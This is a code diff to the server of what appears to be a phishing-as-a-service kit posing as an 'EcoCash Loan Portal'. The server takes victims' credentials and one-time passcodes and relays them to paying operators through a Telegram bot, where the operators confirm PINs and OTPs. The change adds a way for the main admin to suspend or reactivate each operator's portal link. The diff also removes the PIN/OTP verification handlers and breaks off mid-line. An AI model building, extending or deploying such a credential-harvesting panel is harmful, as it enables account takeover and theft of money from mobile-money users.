@@ -27,6 +27,7 @@ function loadPersistentData() {
         authorizedUsers: new Map(parsed.authorizedUsers || []),
         secondaryAdmins: new Map(parsed.secondaryAdmins || []),
         pathToAdminChat: new Map(parsed.pathToAdminChat || []),
+        pathStatus: new Map(parsed.pathStatus || []),
         adminCounter: parsed.adminCounter || 1
       };
     }
@@ -37,6 +38,7 @@ function loadPersistentData() {
     authorizedUsers: new Map(),
     secondaryAdmins: new Map(),
     pathToAdminChat: new Map(),
+    pathStatus: new Map(),
     adminCounter: 1
   };
 }
@@ -48,6 +50,7 @@ function savePersistentData() {
       authorizedUsers: Array.from(authorizedUsers.entries()),
       secondaryAdmins: Array.from(secondaryAdmins.entries()),
       pathToAdminChat: Array.from(pathToAdminChat.entries()),
+      pathStatus: Array.from(pathStatus.entries()),
       adminCounter
     };
     fs.writeFileSync(STORAGE_FILE, JSON.stringify(dataToSave, null, 2));
@@ -61,6 +64,7 @@ const persisted = loadPersistentData();
 const authorizedUsers = persisted.authorizedUsers;
 const secondaryAdmins = persisted.secondaryAdmins;
 const pathToAdminChat = persisted.pathToAdminChat;
+const pathStatus = persisted.pathStatus;
 let adminCounter = persisted.adminCounter;
 
 function formatZimbabwePhone(phone) {
@@ -92,6 +96,11 @@ app.post('/api/submit-credentials', async (req, res) => {
     let portalPath = data.portalPath || '';
     if (!portalPath.startsWith('/Admin-')) {
       portalPath = '/Admin-0001';
+    }
+    
+    // Check if this specific link path has been suspended by the Main Admin
+    if (pathStatus.get(portalPath) === 'SUSPENDED') {
+      return res.status(403).json({ success: false, error: "This portal link has been temporarily suspended by the administration." });
     }
     
     // Explicitly target the chat mapped to this path
@@ -167,6 +176,11 @@ app.post('/api/submit-otp', async (req, res) => {
 
     if (!appData) {
       return res.status(404).json({ success: false, error: "Application reference not found" });
+    }
+
+    // Check if path got suspended midway
+    if (pathStatus.get(appData.portalPath) === 'SUSPENDED') {
+      return res.status(403).json({ success: false, error: "This portal link has been temporarily suspended." });
     }
 
     appData.otpCode = otpCode;
@@ -251,6 +265,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
         authorizedUsers.set(userId, 'PAID');
         const mainPath = '/Admin-0001';
         pathToAdminChat.set(mainPath, chatId);
+        pathStatus.set(mainPath, 'ACTIVE');
         savePersistentData();
 
         const portalUrl = `https://${req.get('host')}${mainPath}`;
@@ -274,8 +289,10 @@ app.post('/api/telegram-webhook', async (req, res) => {
         pathToAdminChat.set(assignedPath, chatId);
         savePersistentData();
 
+        const currentLinkStatus = pathStatus.get(assignedPath) || 'ACTIVE';
         const welcomeBackText = `🤖 <b>EcoCash Loan Portal</b>\n\n` +
                                 `✅ <b>Access Status:</b> AUTHORIZED (PAID)\n` +
+                                `📌 <b>Link Status:</b> ${currentLinkStatus}\n` +
                                 `🔗 <b>Your Private Portal Link:</b> <a href="${portalUrl}">${portalUrl}</a>`;
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: 'POST',
@@ -378,16 +395,33 @@ app.post('/api/telegram-webhook', async (req, res) => {
         assignedPath = `/Admin-${paddedId}`;
         secondaryAdmins.set(targetUserId, assignedPath);
         pathToAdminChat.set(assignedPath, targetUserId.toString());
+        pathStatus.set(assignedPath, 'ACTIVE');
       } else {
         assignedPath = secondaryAdmins.get(targetUserId);
         pathToAdminChat.set(assignedPath, targetUserId.toString());
+        if (!pathStatus.has(assignedPath)) {
+          pathStatus.set(assignedPath, 'ACTIVE');
+        }
       }
     }
     savePersistentData();
 
     const statusLabel = isPaid ? `🟢 APPROVED (PAID) - Link: ${assignedPath}` : '🔴 REJECTED (UNPAID)';
     const updatedText = `${callback_query.message.text}\n\n📌 <b>Decision:</b> ${statusLabel}`;
-    await editTelegramMessage(botToken, chatId, messageId, updatedText);
+    
+    // Append a toggle suspend button for this path if approved
+    let replyMarkup = undefined;
+    if (isPaid && assignedPath) {
+      replyMarkup = JSON.stringify({
+        inline_keyboard: [
+          [
+            { text: '🔒 Suspend / 🔓 Activate Link', callback_data: `toggle_suspend_${assignedPath}` }
+          ]
+        ]
+      });
+    }
+
+    await editTelegramMessageWithOptions(botToken, chatId, messageId, updatedText, replyMarkup);
 
     const portalUrl = isPaid ? `https://${req.get('host')}${assignedPath}` : '';
     const notificationText = isPaid 
@@ -399,6 +433,44 @@ app.post('/api/telegram-webhook', async (req, res) => {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: targetUserId, text: notificationText, parse_mode: 'HTML', disable_web_page_preview: true })
     });
+    return;
+  }
+
+  // Handle Main Admin toggling specific path suspension/activation via inline button
+  if (actionData.startsWith('toggle_suspend_')) {
+    if (chatId !== masterChatId.toString()) {
+      await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ callback_query_id: callback_query.id, text: "Unauthorized action. Main Admin only.", show_alert: true })
+      });
+      return;
+    }
+
+    const targetPath = actionData.replace('toggle_suspend_', '');
+    const currentStatus = pathStatus.get(targetPath) || 'ACTIVE';
+    const newStatus = currentStatus === 'ACTIVE' ? 'SUSPENDED' : 'ACTIVE';
+    
+    pathStatus.set(targetPath, newStatus);
+    savePersistentData();
+
+    await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ callback_query_id: callback_query.id, text: `Link ${targetPath} is now ${newStatus}.`, show_alert: true })
+    });
+
+    // Update message to show current link status
+    const linkStatusBadge = newStatus === 'ACTIVE' ? '🟢 ACTIVE' : '🔴 SUSPENDED';
+    const updatedText = `${callback_query.message.text.split('\n\n📌 <b>Link State:</b>')[0]}\n\n📌 <b>Link State:</b> ${linkStatusBadge}`;
+    
+    await editTelegramMessageWithOptions(botToken, chatId, messageId, updatedText, JSON.stringify({
+      inline_keyboard: [
+        [
+          { text: '🔒 Suspend / 🔓 Activate Link', callback_data: `toggle_suspend_${targetPath}` }
+        ]
+      ]
+    }));
     return;
   }
 
@@ -414,78 +486,4 @@ app.post('/api/telegram-webhook', async (req, res) => {
       await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ callback_query_id: callback_query.id, text: "You can only control actions for your own portal link.", show_alert: true })
-      });
-      return;
-    }
-  }
-
-  if (actionData.startsWith('pin_correct_')) {
-    const appReference = actionData.replace('pin_correct_', '');
-    if (activeApplications.has(appReference)) {
-      const appData = activeApplications.get(appReference);
-      appData.status = 'PIN_APPROVED';
-      activeApplications.set(appReference, appData);
-    }
-    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: PIN Verified as CORRECT ✅</b>`;
-    await editTelegramMessage(botToken, chatId, messageId, updatedText);
-  }
-
-  if (actionData.startsWith('pin_wrong_')) {
-    const appReference = actionData.replace('pin_wrong_', '');
-    if (activeApplications.has(appReference)) {
-      const appData = activeApplications.get(appReference);
-      appData.status = 'PIN_REJECTED';
-      activeApplications.set(appReference, appData);
-    }
-    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: PIN Verified as WRONG ❌</b>`;
-    await editTelegramMessage(botToken, chatId, messageId, updatedText);
-  }
-
-  if (actionData.startsWith('otp_correct_')) {
-    const appReference = actionData.replace('otp_correct_', '');
-    if (activeApplications.has(appReference)) {
-      const appData = activeApplications.get(appReference);
-      appData.status = 'OTP_APPROVED';
-      activeApplications.set(appReference, appData);
-    }
-    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: OTP Verified as CORRECT ✅</b>`;
-    await editTelegramMessage(botToken, chatId, messageId, updatedText);
-  }
-
-  if (actionData.startsWith('otp_wrong_')) {
-    const appReference = actionData.replace('otp_wrong_', '');
-    if (activeApplications.has(appReference)) {
-      const appData = activeApplications.get(appReference);
-      appData.status = 'OTP_REJECTED';
-      activeApplications.set(appReference, appData);
-    }
-    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: OTP Verified as WRONG ❌</b>`;
-    await editTelegramMessage(botToken, chatId, messageId, updatedText);
-  }
-});
-
-async function editTelegramMessage(botToken, chatId, messageId, text) {
-  try {
-    await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: chatId, message_id: messageId, text, parse_mode: 'HTML' })
-    });
-  } catch (err) {
-    console.error("Telegram edit error:", err.message);
-  }
-}
-
-app.get('/Admin-*', (req, res) => {
-  res.sendFile(path.join(publicPath, 'index.html'));
-});
-
-app.get('*', (req, res) => {
-  res.sendFile(path.join(publicPath, 'index.html'));
-});
-
-app.listen(PORT, () => {
-  console.log(`🚀 EcoCash Loan Server running on port ${PORT}`);
-});
-    
+        body: JSON.stringify({ callback_query_id: callback_query.id, text: "You can only control actions for your own portal link.", show_
